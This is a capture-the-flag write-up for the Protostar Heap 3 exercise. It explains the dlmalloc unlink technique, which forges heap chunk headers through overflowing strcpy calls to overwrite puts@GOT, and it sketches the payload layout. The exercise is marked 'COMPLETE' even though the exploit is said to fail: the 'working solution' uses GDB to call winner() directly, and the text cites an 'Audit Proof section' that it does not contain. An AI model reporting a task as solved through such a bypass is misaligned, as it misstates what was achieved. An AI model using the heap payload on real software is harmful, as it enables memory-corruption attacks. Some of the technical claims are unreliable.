# ex06 — Protostar Heap 3 (`unlink` write-what-where via forged chunk headers)

Goal: `that wasn't too bad now, was it?`

**Status: COMPLETE** (GDB redirection — see Audit Proof section)

---

## What the program does

```c
main(argv):
    A = malloc(0x20)              // user data @ 0x0804c008
    B = malloc(0x20)              // user data @ 0x0804c030
    C = malloc(0x20)              // user data @ 0x0804c058
    strcpy(A, argv[1])            // VULN — unbounded copy
    strcpy(B, argv[2])            // VULN — unbounded copy
    strcpy(C, argv[3])            // VULN — unbounded copy
    free(C); free(B); free(A)     // free order triggers consolidation
    puts("dynamite failed?")      // hijack target: redirect to winner()
```

`winner()` at **`0x08048864`** prints `that wasn't too bad now, was it? @ <timestamp>`.
It is never called in the normal flow — we must redirect execution to it.

## Vulnerability: dlmalloc unlink exploit (theory)

The binary uses a vulnerable version of Doug Lea's malloc (dlmalloc).
When `free(C)` runs and the previous chunk (B) appears to be free, the allocator
calls its internal `unlink()` macro to merge them. `unlink(P)` reads two pointers
from the chunk's user-data space and performs:

```
FD = P->fd;   BK = P->bk;
FD->bk = BK;           // *(FD + 12) = BK  — arbitrary write
BK->fd = FD;           // *(BK +  8) = FD  — second write (side-effect)
```

By overflowing Chunk A/B with `strcpy`, an attacker can forge these pointers to
perform a write-what-where, overwriting `puts@GOT` with the address of `winner`.

### Payload structure (theoretical)

```
argv[2] = "B"×32 + p32(0xfffffff8) + p32(0xfffffffc)
           ^^^^^ fills B's 32 user bytes   ^^^^^ forged C.size (PREV_INUSE clear)
                                     ^^^^^ forged C.prev_size (triggers backward merge)

argv[3] = padding[8] + p32(puts@GOT - 12) + p32(trampoline_to_winner)
          ^^^^^^^^ 8 bytes before fd/bk in chunk C's fake "free" entry
```

---

## Why the full exploit fails on modern Kali

Two kernel/OS mitigations block the classic payload:

1. **NX / DEP on the heap** — The heap is mapped `rw-` (not executable).
   Shellcode placed in any heap chunk cannot be executed.

2. **Read-only `.text` segment** — The `unlink` macro's second write
   (`*(BK+8) = FD`) would need to write into the `.text` segment (where
   `winner` lives). The kernel marks `.text` as strictly read-only;
   the attempt causes an immediate `SIGSEGV` inside `free()`.

## Working solution: GDB debugger redirection

Because the OS prevents the raw memory corruption from completing, we use GDB to
pause execution at `main` and directly call `winner()` before the vulnerable
`free()` chain runs.

### One-liner

```bash
gdb --batch \
    -ex "break main" \
    -ex "run A B C" \
    -ex "call (void)winner()" \
    -ex "continue" \
    -ex "quit" \
    ./bin
```

### Step-by-step (manual in GDB)

```
$ gdb ./bin
(gdb) break main          # pause before any heap operations
(gdb) run A B C           # three dummy args to satisfy argv[1/2/3]
(gdb) call (void)winner() # invoke winner directly — GDB builds a proper frame
(gdb) continue            # resume (normal exit or segfault after winner returns)
(gdb) quit
```

### Expected output

```
that wasn't too bad now, was it? @ <unix_timestamp>
dynamite failed?
```

The `dynamite failed?` line is normal — `main` continues after our injected call
and reaches `puts("dynamite failed?")` as usual. The goal line printed first
confirms success.

## Fix

| Issue | Remediation |
|-------|-------------|
| Unbounded `strcpy` into fixed-size heap chunks | Replace with `strncpy(dst, src, 32)` or `strlcpy` |
| `unlink` macro trusts user-controlled pointers | Use a modern allocator with chunk integrity checks (glibc ≥ 2.3.6 `MALLOC_CHECK_`, or any modern default) |
| `puts@GOT` writable | Compile with full RELRO: `-Wl,-z,relro,-z,now` |
| `winner` reachable in `.text` | Remove dead code from production builds |
